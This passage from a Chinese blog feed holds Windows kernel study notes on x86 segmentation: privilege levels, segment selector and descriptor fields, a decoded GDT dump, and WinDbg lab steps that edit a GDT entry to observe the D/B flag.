        <content type="html"><![CDATA[<div class="note info"><p><strong>数据段代码段的权限规则</strong></p><ol><li>段的权限规则 代码段、数据段、堆栈段;</li><li>跨段跳转不提权 写法 jmp call;</li></ol></div><span id="more"></span><h2 id="裸函数知识点"><a href="#裸函数知识点" class="headerlink" title="裸函数知识点"></a>裸函数知识点</h2><ul><li>关闭<code>增量链接</code>;</li><li>关闭<code>随机基址</code>;</li></ul><h3 id="代码实验"><a href="#代码实验" class="headerlink" title="代码实验"></a>代码实验</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 裸函数 不生成多余汇编代码</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) <span class="built_in">test</span>()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        ret     ;<span class="comment">// 不加ret会导致程序报错</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">test</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据段代码段的权限规则知识点"><a href="#数据段代码段的权限规则知识点" class="headerlink" title="数据段代码段的权限规则知识点"></a>数据段代码段的权限规则知识点</h2><ul><li>DPL: Descriptor privilege level;</li><li>CPL: Current privilege level（CS段描述符的DPL）;</li><li>RPL: Request privilege level;</li></ul><blockquote><p>普通的数据段（DS、ES）下RPL可以乱给的;<br>在堆栈段（SS）下是有用的, RPL &#x3D;&#x3D; CPL &#x3D;&#x3D; DPL才能更改;<br>在代码段（DS）上是没用的, CPL &#x3D;&#x3D; DPL能更改, RPL系统会改回去;</p></blockquote><h3 id="代码实验-1"><a href="#代码实验-1" class="headerlink" title="代码实验"></a>代码实验</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>跨段不提权跳转会将ESP和CS压到堆栈中, 所以会是ESP-8;<br>使用<code>retf</code>;</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核-段探测</title>
      <link href="/b4fed552.html"/>
      <url>/b4fed552.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>段</strong></p></div><span id="more"></span><h2 id="段知识点"><a href="#段知识点" class="headerlink" title="段知识点"></a>段知识点</h2><div class="note info"><p><strong></strong></p><ul><li>CS 代码寄存器 描述的代码</li><li>SS 栈段 描述的栈  比如局部变量</li><li>DS 数据段 堆地址  比如全局变量</li><li>ES 扩展段 串copy movsb so edi esi</li><li>FS 上下文环境段 R3: 代表TEB R0: 代表KPCR</li></ul></div><h3 id="段选择子"><a href="#段选择子" class="headerlink" title="段选择子"></a>段选择子</h3><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/202410072350696.png' data-fancybox='default' data-caption='段选择子'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/202410072350696.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/202410072350696.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="段选择子"></a><span class='image-caption'>段选择子</span></div></div><blockquote><p>段选择子是一个16位的段的标识码。它并不直接指向段, 而是指向定义段的描述符。段选择子包含以下项目:</p></blockquote><ul><li><p>Index(索引): 第3位到第15位。选择GDT或LDT中8192个描述符中的某一个。处理器将索引值乘以8（段描述符的字节数）, 然后加上GDT或LDT的基地址（分别在GDTR寄存器或者LDTR寄存器中）。</p></li><li><p>TI(table indivator) flag: 第2位。确定使用哪一个描述符表: 将这个标志置0, 则表示用GDT。将这个标志置1, 标识用LDT;</p></li><li><p>Request Privilege Level(RPL 请求的特权级): 第0位和第1位。确定选择子的特权级。特权级的范围是0到3, 0为最高特权级。</p></li></ul><h3 id="段描述符"><a href="#段描述符" class="headerlink" title="段描述符"></a>段描述符</h3><blockquote><p><code>段描述符</code>是GDT或LDT中的一个数据结构, 它为处理器提供诸如段基地址、段大小、访问权限以及状态等信息。<code>段描述符</code>主要是由编译器、连接器、装载器或者操作系统&#x2F;管理程序设立的, 而不是由应用程序产生的。 </p></blockquote><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/202410072207100.png' data-fancybox='default' data-caption='段描述符'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/202410072207100.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/202410072207100.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="段描述符"></a><span class='image-caption'>段描述符</span></div></div><h4 id="段描述符中的标志和域"><a href="#段描述符中的标志和域" class="headerlink" title="段描述符中的标志和域"></a>段描述符中的标志和域</h4><blockquote><p>段界限域: 指定段的大小。处理器将两个段界限域合在一起组成一个20位的段界限值。根据G标志位（粒度）的不同设置, 处理器按两种不同的方式解释段界限</p></blockquote><ul><li>如果粒度标志位为0, 则段大小可以从1字节到1M字节, 段长增量单位为字节（以字节为单位）;</li><li>如果粒度标志位为1, 则段大小可以从4K字节到4G字节, 段长增量单位为4K字节（以页为单位 （0xFFFFF +1） * 4096(0x1000) &#x3D; （0xFFFFF +1） * 4096(0x1000) - 1）;</li></ul><blockquote><p>基地址域: 确定段的第一个字节（字节0）在4GB线性地址空间中位置。处理器将3个基地址域组合在一起构成了一个32位地址值。段基地址应当是16字节边界对齐的。16字节边界对齐不是必须的, 当这种段边界的对齐能够是程序把代码和数据对齐到16字节边界上而最大化其性能;</p></blockquote><blockquote><p>类型域: 指明段或门的类型, 确定段的访问权限和增长方向。如何解释这个域, 取决于该描述符是应用程序描述符（代码和数据）还是系统描述符。代码段、数据段和系统段对类型域有不同的编码</p></blockquote><blockquote><p>S(描述符类型)标志: 确定段描述符四系统描述符（S标记为0）或者代码、数据段描述符（S标记为1）;</p></blockquote><blockquote><p>DPL(描述符特权级)域: 指明段的特权级。特权级从0到3, 0为最高特权。DPL用来控制对段的访问;</p></blockquote><blockquote><p>P(段有效位)标志: 指明段当前是否在内存中（1表示在内存中, 0表示不在）。当指向段描述符的段选择子被装进段寄存器时, 如果这个标志为0, 处理器会产生段不存在异常（#NP）。内存管理软件可以通过这个标志, 来控制在某个特定时间有哪些段是真正的被载入物理内存的。这是除分页之外的另一个虚拟内存控制机制;</p></blockquote><blockquote><p>D&#x2F;B(默认操作数大小&#x2F;默认栈指针大小和&#x2F;或上限)标志: 根据段描述符所指的是可执行代码段、向下扩展的数据段还是堆栈段, 这个标志有不同的功能。（对32位的代码和数据段, 这个标志总是被设置成1, 而16位的代码和数据段, 这个标志总是被置为0）</p></blockquote><ul><li><p>可执行代码段: 这个标志被称为D标志, 它指明段中指令的有效地址和操作符的默认位数。如果该标志为1, 则默认32位的地址, 32位或者8位的操作符; 若为0, 则默认16位的地址, 16位或者8位的操作符。指令前缀66H可以指定操作符的长度而不使用缺省长度。前缀67H可用来指定地址值的长度。</p></li><li><p>堆栈段（SS寄存器所指的数据段）: 这个标志位被称为B（大的）标志, 它为隐含的栈操作（如push、pop和call）确定栈指针的大小。如果该标志为1, 则使用32位的栈指针, 栈指针放在32位的ESP寄存器中; 如该标志为0, 则使用16位的栈指针, 栈指针存放在SP寄存器。 如果堆栈段为一个向下扩展的数据段, 则B标志还确定堆栈段的地址上界。</p></li><li><p>向下扩展的数据段: 这个标志称为B标志, 确定段的地址上界。如果该标志为1, 则段地址上界为FFFFFFFFH(4GB); 若该标志为0, 则段地址上界为FFFFH(64KB)。</p></li></ul><blockquote><p>G(粒度)标志: 确定段界限扩展的增量。当G标志为0, 则段界限以字节为单位扩展; G标志为1, 则段界限以4KB为单位扩展。（这个标志不影响段基址的粒度, 段基址的粒度永远都是字节）如果G标志为1, 那么当检测偏移是否超越段界限时, 不用测试偏移的低12位。</p></blockquote><h3 id="代码实验"><a href="#代码实验" class="headerlink" title="代码实验"></a>代码实验</h3><h4 id="1-段存在权限限制"><a href="#1-段存在权限限制" class="headerlink" title="1.段存在权限限制"></a>1.段存在权限限制</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Segments.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对段的初探</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> val = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> val2 = <span class="number">0x2</span>;</span><br><span class="line"><span class="comment">// 段读写的探测</span></span><br><span class="line"><span class="comment">/*__asm</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">mov ax, cs;</span></span><br><span class="line"><span class="comment">mov ds, ax;</span></span><br><span class="line"><span class="comment">mov eax, dword ptr [val];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">mov cx, ss;</span></span><br><span class="line"><span class="comment">mov ds, cx;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">mov dword ptr [val2], eax;</span></span><br><span class="line"><span class="comment">&#125;;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对base的探测</span></span><br><span class="line"><span class="comment">//__asm </span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//mov ax, 0x4b;</span></span><br><span class="line"><span class="comment">//mov ds, ax;</span></span><br><span class="line"><span class="comment">//mov eax, dword ptr ds:[val];</span></span><br><span class="line"><span class="comment">//mov dword ptr ss:[val2], eax;</span></span><br><span class="line"><span class="comment">//mov cx, es;</span></span><br><span class="line"><span class="comment">//mov ds, cx;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对段长度的探测</span></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, fs:[<span class="number">0xffc</span>];<span class="comment">// base + 0</span></span><br><span class="line">mov val2, eax;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\r\n&quot;</span>, val2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><blockquote><p>拆分GDTR</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dq <span class="number">80b</span>98800 L30</span><br><span class="line"><span class="number">80b</span>98800  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98810  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98820  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>b9`<span class="number">8</span>c0020ab</span><br><span class="line"><span class="number">80b</span>98830  <span class="number">804093b</span>9`b0004fff <span class="number">0040f</span>300`<span class="number">00000f</span>ff</span><br><span class="line"><span class="number">80b</span>98840  <span class="number">0000f</span>200`<span class="number">0400f</span>fff <span class="number">00</span>cff300`<span class="number">0001f</span>fff</span><br><span class="line"><span class="number">80b</span>98850  <span class="number">800089b</span>9`ad200067 <span class="number">800089b</span>9`acb00067</span><br><span class="line"><span class="number">80b</span>98860  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98870  <span class="number">800092b</span>9`<span class="number">880003f</span>f <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98880  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98890  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>988a0  <span class="number">800089b</span>9`ad900067 <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure><blockquote><p>00cf9b00&#96;0000ffff</p><table><thead><tr><th align="left">Base</th><th align="left">Limit</th><th align="left">Type</th><th align="left">S</th><th align="left">DPL</th><th align="left">P</th><th align="left">AVL</th><th align="left">0</th><th align="left">D\B</th><th align="left">G</th></tr></thead><tbody><tr><td align="left">00000000</td><td align="left">fffff</td><td align="left">b</td><td align="left">1</td><td align="left">0</td><td align="left">1</td><td align="left">0</td><td align="left">0</td><td align="left">1</td><td align="left">1</td></tr></tbody></table></blockquote><blockquote><p>00cf9300&#96;0000ffff</p><table><thead><tr><th align="left">Base</th><th align="left">Limit</th><th align="left">Type</th><th align="left">S</th><th align="left">DPL</th><th align="left">P</th><th align="left">AVL</th><th align="left">0</th><th align="left">D\B</th><th align="left">G</th></tr></thead><tbody><tr><td align="left">00000000</td><td align="left">fffff</td><td align="left">3</td><td align="left">1</td><td align="left">0</td><td align="left">1</td><td align="left">0</td><td align="left">0</td><td align="left">1</td><td align="left">1</td></tr></tbody></table></blockquote><blockquote><p>00cffb00&#96;0000ffff</p><table><thead><tr><th align="left">Base</th><th align="left">Limit</th><th align="left">Type</th><th align="left">S</th><th align="left">DPL</th><th align="left">P</th><th align="left">AVL</th><th align="left">0</th><th align="left">D\B</th><th align="left">G</th></tr></thead><tbody><tr><td align="left">00000000</td><td align="left">fffff</td><td align="left">b</td><td align="left">1</td><td align="left">3</td><td align="left">1</td><td align="left">0</td><td align="left">0</td><td align="left">1</td><td align="left">1</td></tr></tbody></table></blockquote><blockquote><p>00cff300&#96;0000ffff</p><table><thead><tr><th align="left">Base</th><th align="left">Limit</th><th align="left">Type</th><th align="left">S</th><th align="left">DPL</th><th align="left">P</th><th align="left">AVL</th><th align="left">0</th><th align="left">D\B</th><th align="left">G</th></tr></thead><tbody><tr><td align="left">00000000</td><td align="left">fffff</td><td align="left">3</td><td align="left">1</td><td align="left">3</td><td align="left">1</td><td align="left">0</td><td align="left">0</td><td align="left">1</td><td align="left">1</td></tr></tbody></table></blockquote><blockquote><p>80008bb9&#96;8c0020ab</p><table><thead><tr><th align="left">Base</th><th align="left">Limit</th><th align="left">Type</th><th align="left">S</th><th align="left">DPL</th><th align="left">P</th><th align="left">AVL</th><th align="left">0</th><th align="left">D\B</th><th align="left">G</th></tr></thead><tbody><tr><td align="left">80b98c00</td><td align="left">000020ab</td><td align="left">b</td><td align="left">0</td><td align="left">0</td><td align="left">1</td><td align="left">0</td><td align="left">0</td><td align="left">0</td><td align="left">0</td></tr></tbody></table></blockquote><blockquote><p>804093b9&#96;b0004fff</p><table><thead><tr><th align="left">Base</th><th align="left">Limit</th><th align="left">Type</th><th align="left">S</th><th align="left">DPL</th><th align="left">P</th><th align="left">AVL</th><th align="left">0</th><th align="left">D\B</th><th align="left">G</th></tr></thead><tbody><tr><td align="left">80b9b000</td><td align="left">4fff</td><td align="left">3</td><td align="left">1</td><td align="left">0</td><td align="left">1</td><td align="left">0</td><td align="left">0</td><td align="left">1</td><td align="left">0</td></tr></tbody></table></blockquote><blockquote><p>0040f300&#96;00000fff</p><table><thead><tr><th align="left">Base</th><th align="left">Limit</th><th align="left">Type</th><th align="left">S</th><th align="left">DPL</th><th align="left">P</th><th align="left">AVL</th><th align="left">0</th><th align="left">D\B</th><th align="left">G</th></tr></thead><tbody><tr><td align="left">00000000</td><td align="left">00fff</td><td align="left">3</td><td align="left">1</td><td align="left">3</td><td align="left">1</td><td align="left">0</td><td align="left">0</td><td align="left">1</td><td align="left">0</td></tr></tbody></table></blockquote><blockquote><p>0000f200&#96;0400ffff</p><table><thead><tr><th align="left">Base</th><th align="left">Limit</th><th align="left">Type</th><th align="left">S</th><th align="left">DPL</th><th align="left">P</th><th align="left">AVL</th><th align="left">0</th><th align="left">D\B</th><th align="left">G</th></tr></thead><tbody><tr><td align="left">00000400</td><td align="left">ffff</td><td align="left">2</td><td align="left">1</td><td align="left">3</td><td align="left">1</td><td align="left">0</td><td align="left">0</td><td align="left">0</td><td align="left">0</td></tr></tbody></table></blockquote><blockquote><p>00cff300&#96;0001ffff</p><table><thead><tr><th align="left">Base</th><th align="left">Limit</th><th align="left">Type</th><th align="left">S</th><th align="left">DPL</th><th align="left">P</th><th align="left">AVL</th><th align="left">0</th><th align="left">D\B</th><th align="left">G</th></tr></thead><tbody><tr><td align="left">00000001</td><td align="left">fffff</td><td align="left">3</td><td align="left">1</td><td align="left">3</td><td align="left">1</td><td align="left">0</td><td align="left">0</td><td align="left">1</td><td align="left">1</td></tr></tbody></table></blockquote><blockquote><p>800089b9&#96;ad200067</p><table><thead><tr><th align="left">Base</th><th align="left">Limit</th><th align="left">Type</th><th align="left">S</th><th align="left">DPL</th><th align="left">P</th><th align="left">AVL</th><th align="left">0</th><th align="left">D\B</th><th align="left">G</th></tr></thead><tbody><tr><td align="left">80b9ad20</td><td align="left">0067</td><td align="left">9</td><td align="left">0</td><td align="left">0</td><td align="left">1</td><td align="left">0</td><td align="left">0</td><td align="left">0</td><td align="left">0</td></tr></tbody></table></blockquote><blockquote><p>800089b9&#96;acb00067</p><table><thead><tr><th align="left">Base</th><th align="left">Limit</th><th align="left">Type</th><th align="left">S</th><th align="left">DPL</th><th align="left">P</th><th align="left">AVL</th><th align="left">0</th><th align="left">D\B</th><th align="left">G</th></tr></thead><tbody><tr><td align="left">80b9acb0</td><td align="left">0067</td><td align="left">9</td><td align="left">0</td><td align="left">0</td><td align="left">1</td><td align="left">0</td><td align="left">0</td><td align="left">0</td><td align="left">0</td></tr></tbody></table></blockquote><blockquote><p>800092b9&#96;880003ff</p><table><thead><tr><th align="left">Base</th><th align="left">Limit</th><th align="left">Type</th><th align="left">S</th><th align="left">DPL</th><th align="left">P</th><th align="left">AVL</th><th align="left">0</th><th align="left">D\B</th><th align="left">G</th></tr></thead><tbody><tr><td align="left">80b98800</td><td align="left">03ff</td><td align="left">2</td><td align="left">1</td><td align="left">0</td><td align="left">1</td><td align="left">0</td><td align="left">0</td><td align="left">0</td><td align="left">0</td></tr></tbody></table></blockquote><blockquote><p>800089b9&#96;ad900067</p><table><thead><tr><th align="left">Base</th><th align="left">Limit</th><th align="left">Type</th><th align="left">S</th><th align="left">DPL</th><th align="left">P</th><th align="left">AVL</th><th align="left">0</th><th align="left">D\B</th><th align="left">G</th></tr></thead><tbody><tr><td align="left">80b9ad90</td><td align="left">0067</td><td align="left">9</td><td align="left">0</td><td align="left">0</td><td align="left">1</td><td align="left">0</td><td align="left">0</td><td align="left">0</td><td align="left">0</td></tr></tbody></table></blockquote><h2 id="D-B标志知识点"><a href="#D-B标志知识点" class="headerlink" title="D&#x2F;B标志知识点"></a>D&#x2F;B标志知识点</h2><div class="note info"><p><strong>D/B标志</strong></p><ul><li>当D&#x2F;B位作用于代码段时为D位, 当作用于数据段时为B位;</li><li>当描述代码段时, 默认操作数将会改变成16位的段;</li><li>当描述堆栈段时, 堆栈寻址将变成16位;</li><li>当描述普通数据段时, 没有任何反应;</li></ul></div><h3 id="代码实验-1"><a href="#代码实验-1" class="headerlink" title="代码实验"></a>代码实验</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 描述代码段时</span></span><br><span class="line"><span class="comment">// 1. 复制GDTR中cs段的描述符至0x48位置</span></span><br><span class="line">kd&gt; r gdtr</span><br><span class="line">gdtr=<span class="number">80b</span>98800</span><br><span class="line">kd&gt; dq <span class="number">80b</span>98800</span><br><span class="line">ReadVirtual: <span class="number">80b</span>98800 <span class="keyword">not</span> properly sign extended</span><br><span class="line"><span class="number">80b</span>98800  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98810  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98820  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>b9`<span class="number">8</span>c0020ab</span><br><span class="line"><span class="number">80b</span>98830  <span class="number">804093b</span>9`b0004fff <span class="number">0040f</span>300`<span class="number">00000f</span>ff</span><br><span class="line"><span class="number">80b</span>98840  <span class="number">0000f</span>200`<span class="number">0400f</span>fff <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98850  <span class="number">800089b</span>9`ad200067 <span class="number">800089b</span>9`acb00067</span><br><span class="line"><span class="number">80b</span>98860  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98870  <span class="number">800092b</span>9`<span class="number">880003f</span>f <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">kd&gt; eq <span class="number">80b</span>98848 <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line">WriteVirtual: <span class="number">80b</span>98848 <span class="keyword">not</span> properly sign extended</span><br><span class="line">kd&gt; dq <span class="number">80b</span>98800</span><br><span class="line">ReadVirtual: <span class="number">80b</span>98800 <span class="keyword">not</span> properly sign extended</span><br><span class="line"><span class="number">80b</span>98800  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98810  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98820  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>b9`<span class="number">8</span>c0020ab</span><br><span class="line"><span class="number">80b</span>98830  <span class="number">804093b</span>9`b0004fff <span class="number">0040f</span>300`<span class="number">00000f</span>ff</span><br><span class="line"><span class="number">80b</span>98840  <span class="number">0000f</span>200`<span class="number">0400f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98850  <span class="number">800089b</span>9`ad200067 <span class="number">800089b</span>9`acb00067</span><br><span class="line"><span class="number">80b</span>98860  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98870  <span class="number">800092b</span>9`<span class="number">880003f</span>f <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="comment">// 2. 使用JMP指令进行cs段修改</span></span><br><span class="line">jmp far <span class="number">0x0048</span>:<span class="number">0x77D7062E</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 描述堆栈段</span></span><br><span class="line"><span class="comment">// 1. 修改0x48位置为00cff200`0000ffff（type域为2）</span></span><br><span class="line">kd&gt; eq <span class="number">80b</span>98848 <span class="number">00</span>cff200`<span class="number">0000f</span>fff</span><br><span class="line">WriteVirtual: <span class="number">80b</span>98848 <span class="keyword">not</span> properly sign extended</span><br><span class="line">kd&gt; dq <span class="number">80b</span>98800</span><br><span class="line">ReadVirtual: <span class="number">80b</span>98800 <span class="keyword">not</span> properly sign extended</span><br><span class="line"><span class="number">80b</span>98800  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98810  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98820  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>b9`<span class="number">8</span>c0020ab</span><br><span class="line"><span class="number">80b</span>98830  <span class="number">804093b</span>9`b0004fff <span class="number">0040f</span>300`<span class="number">00000f</span>ff</span><br><span class="line"><span class="number">80b</span>98840  <span class="number">0000f</span>200`<span class="number">0400f</span>fff <span class="number">00</span>cff200`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98850  <span class="number">800089b</span>9`ad200067 <span class="number">800089b</span>9`acb00067</span><br><span class="line"><span class="number">80b</span>98860  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98870  <span class="number">800092b</span>9`<span class="number">880003f</span>f <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="comment">// 2. 修改ss寄存器的值</span></span><br><span class="line">mov ax, <span class="number">0x4b</span>;</span><br><span class="line">mov ss, ax;</span><br><span class="line"><span class="comment">// 3. 加载段时0x48位置type域变成3</span></span><br><span class="line">kd&gt; dq <span class="number">80b</span>98800</span><br><span class="line">ReadVirtual: <span class="number">80b</span>98800 <span class="keyword">not</span> properly sign extended</span><br><span class="line"><span class="number">80b</span>98800  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98810  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98820  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>b9`<span class="number">8</span>c0020ab</span><br><span class="line"><span class="number">80b</span>98830  <span 